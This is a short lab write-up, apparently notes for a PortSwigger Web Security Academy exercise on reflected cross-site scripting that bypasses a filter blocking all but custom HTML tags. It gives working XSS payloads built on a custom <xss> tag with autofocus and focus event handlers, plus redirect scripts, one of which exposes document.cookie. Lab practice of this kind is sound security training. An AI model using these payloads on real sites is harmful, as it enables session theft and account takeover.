# Reflected XSS into HTML context with all tags blocked except custom ones

## This lab blocks all HTML tags except custom ones.

## To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

### HINT:

`<a id=x tabindex=1 onfocusin=alert(1)></a>`
convert to custom tag
`<xss autofocus tabindex=1 onfocus=alert(1)></xss>`
paste into search url

```javascript
<script>
  location =
  'https://0a4300be04a99807817ca288007300f9.web-security-academy.net/?search=%3Cxss%20autofocus%20tabindex=1%20onfocusin=alert(1)%3E%3C/xss%3E';
</script>
```

```javascript
<script>
  {" "}
  location = 'https://0a4300be04a99807817ca288007300f9.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';{" "}
</script>
```
